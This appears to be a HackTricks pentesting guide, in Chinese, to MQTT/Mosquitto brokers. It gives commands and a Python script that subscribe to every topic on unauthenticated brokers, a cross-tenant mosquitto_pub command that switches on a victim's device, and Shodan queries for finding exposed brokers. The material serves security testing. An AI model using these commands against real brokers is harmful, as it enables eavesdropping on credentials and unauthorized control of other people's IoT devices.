# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## 基本信息

**消息队列遥测传输 (MQTT)** 被称为一种 **发布/订阅消息协议**，以极简和轻量著称。该协议专为设备能力受限并在带宽低、延迟高或连接不可靠的网络环境中运行的场景设计。MQTT 的核心目标包括最小化网络带宽使用并降低对设备资源的需求。此外，它还旨在保持可靠的通信并提供一定程度的传递保证。这些目标使 MQTT 非常适合新兴的 **机与机 (M2M) 通信** 和 **物联网 (IoT)** 领域，在这些领域高效连接大量设备至关重要。另一方面，MQTT 对移动应用也非常有益，因为在这些场景下节省带宽和电池寿命至关重要。

**默认端口：** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## 检查流量

当 MQTT brokers 收到 **CONNECT** 数据包时，会回复一个 **CONNACK** 数据包。该数据包包含一个返回码，这对于理解连接状态至关重要。返回码 **0x00** 表示凭证已被接受，表明连接成功。相反，返回码 **0x05** 表示凭证无效，从而阻止连接。

例如，如果 broker 因凭证无效而拒绝连接，情景可能如下：
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

**Authentication is totally optional**，即使正在进行 authentication，**encryption is not used by default**（credentials 以 clear text 发送）。仍可执行 MITM 攻击以窃取密码。

要连接到 MQTT 服务，你可以使用: [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell) 并订阅所有主题，命令如下：
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
你也可以使用 [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)

你还可以使用：
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
或者你可以**运行这段代码，尝试连接到无需认证的 MQTT 服务，订阅所有主题并监听它们**：
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### 发布/订阅 模式 <a href="#b667" id="b667"></a>

发布/订阅 模型由以下部分组成：

- **Publisher**: 在 broker 的一个（或多个）topic 上发布消息。
- **Subscriber**: 在 broker 上订阅一个（或多个）topic 并接收发布者发送的所有消息。
- **Broker**: 将所有消息从发布者路由到订阅者。
- **Topic**: 由一个或多个级别组成，级别之间用正斜杠分隔（例如，/smartshouse/livingroom/temperature）。

### 数据包格式 <a href="#f15a" id="f15a"></a>

每个 MQTT 包都包含一个固定头（见图 02）。图 02：固定头

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### Packet Types

- CONNECT (1): 由客户端发起，请求与服务器建立连接。
- CONNACK (2): 服务器对成功连接的确认。
- PUBLISH (3): 用于在客户端与服务器之间发送消息。
- PUBACK (4): 对 PUBLISH 包的确认。
- PUBREC (5): 消息传递协议的一部分，用于确保消息被接收。
- PUBREL (6): 消息传递过程中的进一步确认，表示消息已释放。
- PUBCOMP (7): 消息传递协议的最终步骤，表示完成。
- SUBSCRIBE (8): 客户端请求订阅某个 topic 的消息。
- SUBACK (9): 服务器对 SUBSCRIBE 请求的确认。
- UNSUBSCRIBE (10): 客户端请求取消订阅某个 topic。
- UNSUBACK (11): 服务器对 UNSUBSCRIBE 请求的响应。
- PINGREQ (12): 客户端发送的心跳消息。
- PINGRESP (13): 服务器对心跳消息的响应。
- DISCONNECT (14): 由客户端发起以终止连接。
- 值 0 和 15 被标记为保留，禁止使用。

## IoT MQTT 生态系统攻击：明文 broker 和 topic ACL 绕过

许多消费级 IoT 平台会暴露 MQTT brokers，供两类不同角色使用：
- 桥接无线协议（例如 BLE/LoRa/Zigbee）到云端的 gateway/hub 设备。
- 通过 “app” topics 控制设备的移动应用或 web 后端。

在 pentest 中可以利用的常见弱点：

- Plaintext MQTT 通过非常规端口（例如 TCP/8001）而不是 MQTTS。任何在路径上的观察者都可以读取凭证和控制帧。使用 Wireshark 在非常规端口上识别明文的 CONNECT/CONNACK 和 SUBSCRIBE/PUBLISH 流量。
- 每租户的 topic ACL 弱或缺失。如果 topics 仅按 deviceId 命名空间（例如 "/tenantless/<deviceId>/tx"），任何已认证用户都可能向其他租户的设备 PUBLISH。
- 通过维护/管理员 topics 泄露敏感数据（例如在配置变更后以明文广播 Wi‑Fi 凭据）。

示例（用真实值替换占位符）：

订阅可能包含敏感信息的 topics，使用已知的 topic 前缀和 device IDs：
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
当 ACLs 薄弱时的跨租户控制 (publish to another tenant’s device topic):
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- 在 IoT 中，MQTT 在非标准端口以明文传输很常见。考虑在替代端口上搜索代理并通过协议检测确认。

## References

- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
